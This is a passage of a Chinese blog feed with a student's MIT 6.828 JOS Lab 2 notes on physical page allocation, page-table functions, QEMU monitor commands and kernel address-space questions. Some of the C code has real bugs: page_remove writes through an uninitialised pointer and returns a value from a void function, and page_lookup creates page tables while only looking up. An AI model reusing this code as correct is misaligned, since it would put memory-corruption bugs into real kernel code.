class="line"><span class="keyword">if</span>(!create)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">pp = page_alloc(ALLOC_ZERO);</span><br><span class="line"><span class="keyword">if</span>(!pp)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">pte = (<span class="keyword">pte_t</span>*)page2kva(pp);</span><br><span class="line">pp-&gt;pp_ref ++;</span><br><span class="line"><span class="comment">//设置页目录项</span></span><br><span class="line">*pde = PADDR(pte) | (PTE_P | PTE_W | PTE_U);<span class="comment">//present writeable user</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> &amp;pte[ptx];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是boot_map_region函数，把虚拟地址空间范围[va, va+size)映射到物理空间[pa, pa+size)的映射关系加入到页表pgdir中。这个函数主要的目的是为了设置虚拟地址UTOP之上的地址范围，这一部分的地址映射是静态的，在操作系统的运行过程中不会改变，所以这个页的PageInfo结构体中的pp_ref域的值不会发生改变。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">boot_map_region(<span class="keyword">pde_t</span> *pgdir, <span class="keyword">uintptr_t</span> va, <span class="keyword">size_t</span> size, <span class="keyword">physaddr_t</span> pa, <span class="keyword">int</span> perm)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"><span class="comment">//计算总共有多少页</span></span><br><span class="line"><span class="keyword">size_t</span> pgs = size / PGSIZE;</span><br><span class="line"><span class="keyword">if</span>(size % PGSIZE != <span class="number">0</span>)&#123; <span class="comment">//这里要注意页对齐，如果多出来几个字节，需多分配一个页</span></span><br><span class="line">pgs++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; pgs;i++)&#123;</span><br><span class="line"><span class="keyword">pte_t</span> *pte = pgdir_walk(pgdir,(<span class="keyword">void</span>*)va,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(pte == <span class="literal">NULL</span>)&#123;</span><br><span class="line">panic(<span class="string">&quot;boot_map_region(): out of memory&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">*pte = pa | perm | PTE_P;</span><br><span class="line">va += PGSIZE;</span><br><span class="line">pa += PGSIZE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是page_insert函数，把一个物理内存中页pp与虚拟地址va建立映射关系。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">page_insert(<span class="keyword">pde_t</span> *pgdir, struct PageInfo *pp, <span class="keyword">void</span> *va, <span class="keyword">int</span> perm)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"><span class="keyword">pte_t</span> *pte = pgdir_walk(pgdir,va,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(!pte)&#123;</span><br><span class="line"><span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line">&#125;</span><br><span class="line">pp-&gt;pp_ref ++;</span><br><span class="line"><span class="comment">//if is already mapped</span></span><br><span class="line"><span class="keyword">if</span>(*pte &amp; PTE_P)&#123;</span><br><span class="line">page_remove(pgdir,va);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*pte = page2pa(pp) | perm | PTE_P;</span><br><span class="line"><span class="comment">//pp-&gt;pp_ref ++;</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里提一点这个pp_ref++的位置，因为如果是先执行page_remove的话，如果将ref刚好置零那么此时就会释放了这个page，所以要在page_remove之前先将ref加一。</p><p>接着就是page_lookup函数，返回虚拟地址va所映射的物理页的pageinfo</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *</span></span><br><span class="line"><span class="class"><span class="title">page_lookup</span>(<span class="title">pde_t</span> *<span class="title">pgdir</span>, <span class="title">void</span> *<span class="title">va</span>, <span class="title">pte_t</span> **<span class="title">pte_store</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">pp</span>;</span></span><br><span class="line"><span class="keyword">pte_t</span> *pte = pgdir_walk(pgdir,va,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(!pte)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(pte_store)&#123;</span><br><span class="line">*pte_store = pte;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(*pte &amp; PTE_P))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">pp = pa2page(PTE_ADDR(*pte));</span><br><span class="line"><span class="keyword">return</span> pp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后就是page_remove函数了，就是把虚拟地址va和物理页的映射关系删除</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">page_remove(<span class="keyword">pde_t</span> *pgdir, <span class="keyword">void</span> *va)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"><span class="keyword">pte_t</span> *pte;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> * <span class="title">pp</span> =</span> page_lookup(pgdir,va,pte);</span><br><span class="line"><span class="keyword">if</span>(!pp)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">page_decref(pp);<span class="comment">//ref值减一</span></span><br><span class="line">tlb_invalidate(pgdir,va);</span><br><span class="line">*pte = <span class="number">0</span>;<span class="comment">//页表项内容置零</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h3&gt;&lt;p&gt;在kern/pmap.c中必须实现pgdir_walk()  boot_map_region()  page_lookup()  page_
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="OS" scheme="https://billyotry.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>【MIT 6.828】Lab2-Exercise3</title>
    <link href="https://billyotry.github.io/2021/08/01/%E3%80%90MIT6.828%E3%80%91Lab2-Exercise3/"/>
    <id>https://billyotry.github.io/2021/08/01/%E3%80%90MIT6.828%E3%80%91Lab2-Exercise3/</id>
    <published>2021-08-01T02:59:17.371Z</published>
    <updated>2021-08-01T09:00:24.082Z</updated>
    
    <content type="html"><![CDATA[<h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><p>通过GDB我们只能通过虚拟地址来查看内存所存放的内容，但是如果能访问到物理内存的话，肯定会更有帮助的。们可以看一下QEMU中的一些常用指令，特别是xp指令，可以允许我们去访问物理内存地址。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>由于官方给的进入moniter的方式在我这不好使，用如下命令进入：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">qemu-system-i386 -hda obj&#x2F;kern&#x2F;kernel.img -monitor stdio -gdb tcp::26000 -D qemu.log  </span><br></pre></td></tr></table></figure><p>　  打开monitor后，我们可以输入如下比较常见的指令：</p><p>　　xp/Nx paddr – 查看paddr物理地址处开始的，N个字的16进制的表示结果。</p><p>　　info registers – 展示所有内部寄存器的状态。</p><p>　　info mem – 展示所有已经被页表映射的虚拟地址空间，以及它们的访问优先级。</p><p>　　info pg – 展示当前页表的结构。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13837151323/0" alt="image-20210801162042097"></p><p>然后是我们的虚拟地址空间</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13837152481/0" alt="image-20210801162103534"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h3&gt;&lt;p&gt;通过GDB我们只能通过虚拟地址来查看内存所存放的内容，但是如果能访问到物理内存的话，肯定会更有帮助的。们可以看一下QEMU中的一些常用指令，
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="OS" scheme="https://billyotry.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>【MIT 6.828】Lab2-Exercise1</title>
    <link href="https://billyotry.github.io/2021/07/30/%E3%80%90MIT6.828%E3%80%91Lab2-Exercise1/"/>
    <id>https://billyotry.github.io/2021/07/30/%E3%80%90MIT6.828%E3%80%91Lab2-Exercise1/</id>
    <published>2021-07-30T08:41:44.114Z</published>
    <updated>2021-08-01T03:01:29.088Z</updated>
    
    <content type="html"><![CDATA[<h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><p>在文件 kern/pmap.c 中，你必须要完成以下几个子函数的代码</p><p>boot_alloc();  mem_init();  page_init();   page_alloc();   page_free();</p><p>check_page_free_list()和check_page_alloc()两个函数将会检测你写的页分配器代码是否正确。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这部分我们需要写一个物理内存页的allocator。要求实现kern/pmap.c文件中的boot_alloc()，mem_init()，page_init()，page_alloc()，page_free()。check_page_free_list()和check_page_alloc()中会有一些测试用例，如果没有通过两个函数则说明代码有问题。</p><p>从lab1中我们知道，进入内核后首先调用的是i386_init函数，然后我们查看该函数，它会调用mem_init函数。然后mem_init函数又会调用其他的工具函数实现内核的内存管理。该函数首先调用i386_detect_memory函数来计算有多少物理内存页保存到npages和npages_basemem两个全局变量中，npages记录整个内存的页数，npages_basemem记录basemem的页数。</p><p>之前我们介绍过了，jos把整个物理内存划分成了三个部分：</p><ol><li>0x00000~0xA0000，这部分叫basemem，是可用的。</li><li>0xA0000~0x100000，这部分叫IO hole，是不可用的，主要用来被分配给外部设备。</li><li>0x100000~xxx，这部分就是0x100000往上的空间了，叫做extmem，是可用的，是最重要的内存区域。</li></ol><p>执行完这个函数之后，下两条指令是</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kern_pgdir = (<span class="keyword">pde_t</span> *) boot_alloc(PGSIZE);</span><br><span class="line"><span class="built_in">memset</span>(kern_pgdir, <span class="number">0</span>, PGSIZE);</span><br></pre></td></tr></table></figure><p>其中kern_pgdir是一个指针，pde_t *kern_pgdir是一个指向操作系统页目录表的指针，操作系统之后工作在虚拟内存模式下，就需要这个页目录表进行地址转换。我们为这个页目录表分配的内存空间大小为一页大小，然后把这部分内存清空。</p><p>这里调用了boot_alloc函数，这个是我们首要实现的函数了，该函数就如注释中所说，它只是暂时当作页分配器，之后使用的真实的页分配器是page_alloc函数。</p><p>boot_alloc函数的核心思想就是维护一个静态变量nextfree，里面存放着下一个可以使用的空闲内存空间的虚拟地址，所以当我们每次想要分配n个字节的内存时，我们都需要修改这个变量的值。</p><p>所以添加代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">result = nextfree;</span><br><span class="line">nextfree = ROUNDUP((nextfree + n),PGSIZE);</span><br><span class="line"><span class="keyword">if</span>(nextfree - KERNBASE &gt; npages*PGSIZE)&#123;</span><br><span class="line">panic(<span class="string">&quot;Out of memory!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><p>接下来注释中要求我们分配一块内存，用来存放一个struct PageInfo的数组，数组中的每一个PageInfo代表内存当中的一页。操作系统通过这个数组来追踪所有内存页的使用情况。那么添加如下代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pages = (struct PageInfo*)boot_alloc(npages * <span class="keyword">sizeof</span>(struct PageInfo));</span><br><span class="line"><span class="built_in">memset</span>(pages,<span class="number">0</span>,npages * <span class="keyword">sizeof</span>(struct PageInfo));</span><br></pre></td></tr></table></figure><p>接下来就要调用page_init函数，我们可以到这个函数的定义处具体查看，整个函数大体是由一个for循环构成，遍历所有内存页所对应的在数组中的结构体，并且根据当前页的状态来修改这个结构体的状态，如果页被占用，那么要把这个结构体中的pp_ref置1；如果是空闲页，则把这个页表送入到pages_free_list页表中。根据注释中的提示，第0页已经被占用，io hole部分被占用，extmem也有部分已经被占用，所以添加代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//mark page 0 as in use --1</span></span><br><span class="line">pages[<span class="number">0</span>].pp_ref = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//[PGSIZE,npages_basemem*PGSIZE) is avilable --2</span></span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>;i &lt; npages_basemem;i++)&#123;</span><br><span class="line">pages[i].pp_ref = <span class="number">0</span>;</span><br><span class="line">pages[i].pp_link = page_free_list;</span><br><span class="line">page_free_list = &amp;pages[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//[IOPHYSMEM, EXTPHYSMEM) is never be allocated --3</span></span><br><span class="line"><span class="keyword">for</span>(;i&lt;EXTPHYSMEM/PGSIZE;i++)&#123;</span><br><span class="line">pages[i].pp_ref = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//[EXTPHYSMEM, ...) --4</span></span><br><span class="line"><span class="comment">//in this part,we need to know which pages has been used for pages-table or page-directory or kernel</span></span><br><span class="line"><span class="keyword">physaddr_t</span> lasted_in_use_address = PADDR(boot_alloc(<span class="number">0</span>));</span><br><span class="line"><span class="keyword">size_t</span> last_number = lasted_in_use_address/PGSIZE;</span><br><span class="line"><span class="keyword">for</span>(;i&lt;last_number;i++)&#123;</span><br><span class="line">pages[i].pp_ref = <span class="number">1</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//other pages for free</span></span><br><span class="line"><span class="keyword">for</span>(;i &lt; npages;i++)&#123;</span><br><span class="line">pages[i].pp_ref = <span class="number">0</span>;</span><br><span class="line">pages[i].pp_link = page_free_list;</span><br><span class="line">page_free_list = &amp;pages[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化关于所有物理内存页的相关数据结构后，进入check_page_free_list(1)子函数，这个函数的功能就是检查page_free_list链表的所谓空闲页，是否真的都是合法的，空闲的。接下来调用check_page_alloc函数，所以我们要实现page_alloc和page_free函数。</p><p>通过注释我们可以知道知道这个函数的功能就是分配一个物理页，然后返回值就是这个物理页对应的PageInfo结构体。</p><p>首先我们可以知道我们所用到的结构如下图：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13835464680/0" alt="image-20210731234539766"></p><p>然后我们的page_alloc的实现如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *</span></span><br><span class="line"><span class="class"><span class="title">page_alloc</span>(<span class="title">int</span> <span class="title">alloc_flags</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">result</span> =</span> page_free_list;</span><br><span class="line"><span class="comment">//cprintf(&quot;result = %lx\n&quot;,result);</span></span><br><span class="line"><span class="keyword">if</span>(!page_free_list)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">page_free_list = result-&gt;pp_link;</span><br><span class="line">result-&gt;pp_link = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(alloc_flags&amp;ALLOC_ZERO)&#123;</span><br><span class="line"><span class="built_in">memset</span>(page2kva(result),<span class="number">0</span>,PGSIZE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是我们的page_free函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">page_free(struct PageInfo *pp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"><span class="comment">// Hint: You may want to panic if pp-&gt;pp_ref is nonzero or</span></span><br><span class="line"><span class="comment">// pp-&gt;pp_link is not NULL.</span></span><br><span class="line"><span class="keyword">if</span>(pp-&gt;pp_link || pp-&gt;pp_ref)&#123;</span><br><span class="line">panic(<span class="string">&quot;page_free: pp-&gt;pp_ref is nonzero or pp-&gt;pp_link is not NULL&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">pp-&gt;pp_link = page_free_list;</span><br><span class="line">page_free_list = pp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重新回到mem_init()的流程中来，在调用page_init()后，会调用check_page_free_list(1)和check_page_alloc()。这两个函数通过一系列断言，判断我们的实现是否符合预期。需要注意的是check_page_free_list()中的这段代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (only_low_memory) &#123;</span><br><span class="line"><span class="comment">// Move pages with lower addresses first in the free</span></span><br><span class="line"><span class="comment">// list, since entry_pgdir does not map all pages.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">pp1</span>, *<span class="title">pp2</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> **<span class="title">tp</span>[2] =</span> &#123; &amp;pp1, &amp;pp2 &#125;;</span><br><span class="line"><span class="keyword">for</span> (pp = page_free_list; pp; pp = pp-&gt;pp_link) &#123;</span><br><span class="line"><span class="keyword">int</span> pagetype = PDX(page2pa(pp)) &gt;= pdx_limit;</span><br><span class="line">*tp[pagetype] = pp;</span><br><span class="line">tp[pagetype] = &amp;pp-&gt;pp_link;</span><br><span class="line">&#125;<span class="comment">//执行该for循环后，pp1指向（0~4M）中地址最大的那个页的PageInfo结构。pp2指向所有页中地址最大的那个PageInfo结构</span></span><br><span class="line">*tp[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">*tp[<span class="number">0</span>] = pp2;</span><br><span class="line">page_free_list = pp1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里主要就是调整page_free_list链表的顺序，从我之前的图就能知道之前链表的顺序是从高地址到低地址分配的，现在调整后分配顺序就可以从低地址到高地址了。</p><blockquote><p>提一点就是现在映射的都是物理地址的0到0x100000映射到虚拟地址0xf0100000往后。</p></blockquote><p>附一张物理内存布局图</p><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab2/lab2_2_physical_memory_after_pages.png" alt="执行mem_init()后的物理内存"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h3&gt;&lt;p&gt;在文件 kern/pmap.c 中，你必须要完成以下几个子函数的代码&lt;/p&gt;
&lt;p&gt;boot_alloc();  mem_init();  
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="OS" scheme="https://billyotry.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>【MIT 6.828】JOS学习笔记 Lab2</title>
    <link href="https://billyotry.github.io/2021/07/30/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab2/"/>
    <id>https://billyotry.github.io/2021/07/30/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab2/</id>
    <published>2021-07-30T01:39:54.940Z</published>
    <updated>2021-08-02T15:14:16.325Z</updated>
    
    <content type="html"><![CDATA[<p>lab2中多出来了几个文件：</p><p>inc/memlayout.h</p><p>kern/pmap.c</p><p>kern/pmap.h</p><p>kern/kclock.h</p><p>kern/kclock.c</p><p>memlayout.h描述了虚拟地址空间的布局，我们需要通过修改pmap.c文件来实现这个结构。memlayout.h和pmap.h文件定义了一个PageInfo结构，利用这个结构可以记录哪些物理页是空闲的。kclock.c和kclock.h文件中操作的是用电池充电的时钟，以及CMOS RAM设备。在这个设备中记录着PC机拥有的物理内存的数量。在pmap.c中的代码必须读取这个设备的信息才能弄清楚到底有多少内存。</p><h2 id="Part-1-Physical-Page-Management"><a href="#Part-1-Physical-Page-Management" class="headerlink" title="Part 1: Physical Page Management"></a>Part 1: Physical Page Management</h2><p>操作系统必须要追踪记录哪些物理内存区域是可用的，哪些是被占用的。JOS内核以页(page)为最小粒度来管理内存的，它使用MMU来映射，保护每一块被分配出去的内存。</p><p>在这里要具体编写一个物理内存页的分配子函数。它利用一个结构体PageInfo的链表来记录哪些页是空闲的，链表中的每一个节点对于一个物理页。我们需要先编写物理页面分配器，然后才能编写虚拟内存实现，因为页表管理自身也需要分配物理内存来存储页表。</p><h2 id="Part-2-Virtual-Memory"><a href="#Part-2-Virtual-Memory" class="headerlink" title="Part 2: Virtual Memory"></a>Part 2: Virtual Memory</h2><h3 id="Virtual-Linear-and-Physical-Addresses"><a href="#Virtual-Linear-and-Physical-Addresses" class="headerlink" title="Virtual, Linear, and Physical Addresses"></a>Virtual, Linear, and Physical Addresses</h3><p>在x86体系中，一个虚拟地址是由两部分组成，一个是段选择子，另一个是段内偏移。一个线性地址指的是通过段地址转换机制把虚拟地址转换之后得到的地址。一个物理地址指的是分页地址机制把线性地址进行转换之后得到的真是的内存地址，这个地址最终将会送到内存芯片的地址总线上。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">           Selector  +--------------+         +-----------+</span><br><span class="line">          ----------&gt;|              |         |           |</span><br><span class="line">                     | Segmentation |         |  Paging   |</span><br><span class="line">Software             |              |--------&gt;|           |----------&gt;  RAM</span><br><span class="line">            Offset   |  Mechanism   |         | Mechanism |</span><br><span class="line">          ----------&gt;|              |         |           |</span><br><span class="line">                     +--------------+         +-----------+</span><br><span class="line">            Virtual                   Linear                Physical</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在boot/boot.S文件中，我们引入了一个全局描述符表，这个表通过把所有段的基址设置为0，界限设置为0xffffffff的方式，关闭了分段的功能，所以虚拟地址中的选择子的部分就完全没有了意义，那么线性地址中的值就总是等于虚拟地址中段内偏移的值。在lab1中已经安装了一个简易的页目录和页表，将虚拟地址[0, 4MB)映射到物理地址[0, 4MB)，[0xF0000000, 0xF0000000+4MB)映射到[0, 4MB），这个页表仅仅映射了4MB的内存，在我们的JOS系统中，我们希望能拓展到物理内存的头256MB空间上，并且把这部分物理空间映射到从0xf0000000开始的虚拟空间中，以及一些其他的虚拟地址空间中。</p><p>一旦进入了保护模式，我们就不能直接使用线性地址或者物理地址了。所有代码中的地址的引用都是虚拟地址的形式，然后被MMU系统所转换，所有C语言中的指针都是虚拟地址。</p><p>JOS内核通常需要把地址按照以一种模糊的值或者整数值的形式来操纵，而不是直接解析引用，比如物理内存分配器。有时使用虚拟地址，有时使用物理地址。为了能够帮助我们记录代码，JOS源文件中的地址被区分为两种情况：</p><p>　　uintptr_t – 表示虚拟地址</p><p>　　physaddr_t – 表示物理地址</p><p>这两种类型其实都是32位的整型数(uint32_t)，所以如果你把一个类型的变量的值赋给另一个类型变量，编译器不会报错。但是由于他们都是整型数，所以如果你打算解引用(deference)他们，编译器会报错。</p><p>JOS内核可以先对uintptr_t类型的值进行强制类型转换，然后再解析引用。但是对于physaddr_t的值，我们不能这么做，因为内核是需要MMU（内存管理单元）来首先对你输入的地址进行转化的，如果你对physaddr_t进行强制类型转换再解引用，最终你得到的你要访问的地址，可能不是你要找的真实物理地址。</p><p>所以</p><p><img src="https://images2015.cnblogs.com/blog/809277/201603/809277-20160316103653162-1590673802.png" alt="img"></p><blockquote><p><strong>Question</strong></p><p>假设下面的JOS内核代码是正确的，变量x应该是什么类型的，uintptr_t还是physaddr_t？</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mystery_t</span> x;</span><br><span class="line"><span class="keyword">char</span>* value = return_a_pointer();</span><br><span class="line">*value = <span class="number">10</span>;</span><br><span class="line">x = (<span class="keyword">mystery_t</span>) value;</span><br></pre></td></tr></table></figure><p>应该是uintptr_t。第三句对*value进行了赋值，所以value肯定是一个虚拟地址，因为直接解引用物理地址是没有意义的。那么x肯定也是虚拟地址，要不然将虚拟地址赋值给一个物理地址也没有意义的。</p></blockquote><p>JOS内核有时需要读取或者修改内存，但是这时有可能他只知道这个要被修改的内存的物理地址。举个例子，当我们想要加入一个新的页表项的时时，我们需要分配一块物理内存来存放页目录项，然后初始化这块内存。然而，内核，它是不能绕过 虚拟地址转换 这一步的，因而它也不能直接加载或者存储物理地址。那么我们如何把物理地址转换为虚拟地址，我们可以采用KADDR(pa)指令来获取。其中pa指的是物理地址。同样的，如果想通过虚拟地址的值求得物理地址的值，我们可以采用PADDR(va)指令。</p><h3 id="Reference-counting"><a href="#Reference-counting" class="headerlink" title="Reference counting"></a>Reference counting</h3><p>在之后的实验中，将会经常遇到一种情况，多个不同的虚拟地址被映射到相同的物理页上。这时我们需要记录一下每一个物理页上存在着多少不同的虚拟地址来引用它，这个值存放在这个物理页的PageInfo结构体的pp_ref成员中，当这个值为0时，这个物理页才可以被释放。通常来说，任意一个物理页的pp_ref值等于它所在的页表项中，被位于虚拟地址UTOP之下的虚拟页所映射的次数(UTOP之上的地址范围在启动的时候已经被映射完成了，之后不会被改动)。当我们使用page_alloc函数的时候需要注意。它所返回的页的引用计数值总是0，所以pp_ref应该被马上加一。</p><h3 id="Page-Table-Management"><a href="#Page-Table-Management" class="headerlink" title="Page Table Management"></a>Page Table Management</h3><p>现在我们可以着手开始编写管理页表的程序了：包括插入删除线性地址到物理地址的映射关系，以及创建页表等等。</p><h2 id="Part-3-Kernel-Address-Space"><a href="#Part-3-Kernel-Address-Space" class="headerlink" title="Part 3: Kernel Address Space"></a>Part 3: Kernel Address Space</h2><p>JOS把32位的线性地址虚拟空间分为两个部分。其中用户环境(进程运行环境)通常占据低地址的那部分，叫用户地址空间。而操作系统内核总是占据高地址的部分，叫内核地址空间。这两个部分的分界线是定义在memlayout.h文件中的一个宏ULIM。JOS为内核保留了256MB左右的虚拟地址空间，</p><h3 id="Permissions-and-Fault-Isolation"><a href="#Permissions-and-Fault-Isolation" class="headerlink" title="Permissions and Fault Isolation"></a>Permissions and Fault Isolation</h3><p>由于内核和用户进程只能访问各自的地址空间，所以我们必须在x86页表中使用访问权限位(Permission Bits)来使用户进程的代码只能访问用户地址空间，而不是内核地址空间。否则用户代码中的一些错误可能会覆写内核中的数据，最终导致内核的崩溃。</p><p>处在用户地址空间中的代码不能访问高于ULIM的地址空间，但是内核可以读写这部分空间。而内核和用户对于地址范围[UTOP, ULIM]有着相同的访问权限，那就是可以读取但是不可以写入。这一个部分的地址空间通常被用于把一些只读的内核数据结构暴露给用户地址空间的代码。在UTOP之下的地址范围是给用户进程使用的，用户进程可以访问，修改这部分地址空间的内容。</p><h3 id="Initializing-the-Kernel-Address-Space"><a href="#Initializing-the-Kernel-Address-Space" class="headerlink" title="Initializing the Kernel Address Space"></a>Initializing the Kernel Address Space</h3><p>现在我们要设置一下UTOP之上的地址空间：这也是整个虚拟地址空间中的内核地址空间部分。inc/memlayout.h文件中已经向你展示了这部分地址空间的布局。你可以使用你刚刚编写的函数来设置这些地址的布局。</p><blockquote><p><strong>Question</strong></p><p>1.到目前为止页目录表中已经包含多少有效页目录项？他们都映射到哪里？</p><p>3BD号页目录项，指向的是kern_pgdir</p><p>3BC号页目录项，指向的是pages数组</p><p>3BF号页目录项，指向的是bootstack</p><p>3C0~3FF号页目录项，指向的是kernel</p><p>2.我们已将内核和用户环境放在同一地址空间中。 为什么用户程序无法读取或写入内核的内存？ 哪些特定机制保护内核内存？</p><p>用户程序不能随意修改内核中代码，数据，否则可能会破坏内核，造成程序崩溃。</p><p>正常的操作系统通常采用两个部件来完成对内核地址的保护，一个是通过段机制来实现的，但是JOS中的分段功能并没有实现。二就是通过分页机制来实现，通过把页表项中的 Supervisor/User位置0，那么用户态的代码就不能访问内存中的这个页。</p><p>3.这个操作系统的可以支持的最大数量的物理内存是多大？</p><p>由于这个操作系统利用一个大小为4MB的空间UPAGES来存放所有的页的PageInfo结构体信息，每个结构体的大小为8B，所以一共可以存放512K个PageInfo结构体，所以一共可以出现512K个物理页，每个物理页大小为4KB，自然总的物理内存占2GB</p><p>4.回顾entry.S文件中，当分页机制开启时，寄存器EIP的值仍旧是一个小的值。在哪个位置代码才开始运行在高于KERNBASE的虚拟地址空间中的？当程序位于开启分页之后到运行在KERNBASE之上这之间的时候，EIP的值是小的值，怎么保证可以把这个值转换为真实物理地址的？</p><p>在entry.S文件中有一个指令 jmp 